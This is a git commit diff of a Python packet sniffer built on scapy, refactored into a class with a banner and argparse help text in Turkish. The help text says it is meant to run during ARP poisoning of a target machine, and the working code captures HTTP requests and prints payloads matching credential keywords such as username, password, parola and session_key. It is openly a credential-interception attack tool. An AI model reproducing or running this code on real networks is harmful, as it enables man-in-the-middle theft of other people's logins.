330543fa7ba876ebaf1e83e53f11a1b15fbe0e05
mustafadalga <25087769+mustafadalga@users.noreply.github.com>
2019-06-04 04:37:17 +0300

    Update packet_sniffer.py

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,44 +1,87 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import scapy.all as scapy
-from scapy.layers import http
 import argparse
+from termcolor import colored
+import sys
+try:
+	import scapy.all as scapy
+	from scapy.layers import http
+except KeyboardInterrupt:
+	print(colored("\n[-] CTRL+C basıldı.ARP tablosu sıfırlanıyor... Lütfen bekleyiniz...", "red"))
+	print(colored("[-] Uygulamadan çıkış yapıldı!", "red"))
+	sys.exit()
 
 
-def arguman_al():
-	parse=argparse.ArgumentParser()
-	parse.add_argument("--interface",dest="interface",help=" Arayuz secimi")
-	options=parse.parse_args()
-	if not options.interface:
-		parse.error('[-] Lütfen bir arayüz belirleyiniz,daha fazla bilgi için --help kullanın.')
-	else:
-		return options.interface	
+class Sniffer():
+
+	def __init__(self):
+		self.about()
+		self.script_desc()
+
+	def arguman_al(self):
+		parser = argparse.ArgumentParser(description=self.description,epilog=self.kullanim,prog=self.program,formatter_class=argparse.RawTextHelpFormatter)
+		parser.add_argument("--interface",dest="interface",help=" Arayuz secimi")
+		options=parser.parse_args()
+		if not options.interface:
+			parser.error('[-] Lütfen bir arayüz belirleyiniz,daha fazla bilgi için --help kullanın.')
+		else:
+			return options.interface
 
 
-def sniff(interface):
-	scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)
+	def sniff(self,interface):
+		scapy.sniff(iface=interface,store=False,prn=self.process_sniffed_packet)
 
 
-def get_url(paket):
-	return paket[http.HTTPRequest].Host+paket[http.HTTPRequest].Path
+	def get_url(self,paket):
+		return paket[http.HTTPRequest].Host+paket[http.HTTPRequest].Path
 
 
-def get_login_info(paket):
-	if paket.haslayer(scapy.Raw):
-		load=paket[scapy.Raw].load
-		keywords=["username","user","pass","password","sifre","ad","login","kullanici","kullaniciadi","kullaniciAdi","parola"]
-		for keyword in keywords:
-			if keyword in load:
-				return load
+	def get_login_info(self,paket):
+		if paket.haslayer(scapy.Raw):
+			load=paket[scapy.Raw].load
+			keywords=["username","user","pass","password","sifre","ad","login","kullanici","kullaniciadi","kullaniciAdi","parola","session_key","session_password"]
+			for keyword in keywords:
+				if keyword in load:
+					return load
 
-def process_sniffed_packet(paket):
-	if paket.haslayer(http.HTTPRequest):
-		url=get_url(paket)
-		print("[+] HTTP Request >> "+url)
-		login_info=get_login_info(paket)
-		if login_info:
-			print("\n\n[+] Olası kullanıcı adı / Parola > "+login_info+"\n\n")
+	def process_sniffed_packet(self,paket):
+		if paket.haslayer(http.HTTPRequest):
+			url=self.get_url(paket)
+			print("[+] HTTP Request >> "+url)
+			login_info=self.get_login_info(paket)
+			if login_info:
+				print("\n\n[+] Olası kullanıcı adı / Parola > "+login_info+"\n\n")
 
 
-sniff(arguman_al())		
+	def script_desc(self):
+		self.program = "packet_sniffer"
+		self.kullanim ="""Kullanim: python packet_sniffer_yedek.py --interface ARAYUZ\nOrnek Kullanim: python packet_sniffer_yedek.py --interface eth0"""
+		if sys.version_info[0] >= 3:
+			self.description = "Arp Spoofer ile hedef bilgisayar üzerinde ARP zehirlemesi yaparken ,Bu script ile aynı anda http isteklerini dinlemeye alarak olası kullanıcı adı / parola girişlerini görüntüler."
+		else:
+			self.description = unicode("Arp Spoofer ile hedef bilgisayar üzerinde ARP zehirlemesi yaparken ,Bu script ile aynı anda http isteklerini dinlemeye alarak olası kullanıcı adı / parola girişlerini görüntüler.","utf8")
+			self.kullanim = unicode(self.kullanim, "utf8")
+
+	def about(self):
+		print(colored(" ____            _        _     ____        _  __  __           ", "green"))
+		print(colored("|  _ \ __ _  ___| | _____| |_  / ___| _ __ (_)/ _|/ _| ___ _ __ ", "green"))
+		print(colored("| |_) / _` |/ __| |/ / _ \ __| \___ \| '_ \| | |_| |_ / _ \ '__|", "green"))
+		print(colored("|  __/ (_| | (__|   <  __/ |_   ___) | | | | |  _|  _|  __/ |   ", "green"))
+		print(colored("|_|   \__,_|\___|_|\_\___|\__| |____/|_| |_|_|_| |_|  \___|_|   ", "green"))
+		print(colored("# author      :", "green") + "Mustafa Dalga")
+		print(colored("# linkedin    :", "green") + "https://www.linkedin.com/in/mustafadalga")
+		print(colored("# github      :", "green") + "https://github.com/mustafadalga")
+		print(colored("# title       :", "green") + "packet_sniffer.py")
+		print(colored("# description :", "green") + "Arp Spoofer ile hedef bilgisayar üzerinde ARP zehirlemesi yaparken ,Bu script ile aynı anda http isteklerini dinlemeye alarak olası kullanıcı adı / parola girişlerini görüntüler.")
+		print(colored("# date        :", "green") + "22.02.2019")
+		print(colored("# version     :", "green") + "1.0")
+		print(colored("# ==============================================================================", "green"))
+
+
+try:
+	sniffer=Sniffer()
+	sniffer.sniff(sniffer.arguman_al())
+except KeyboardInterrupt:
+	sys.exit()
+
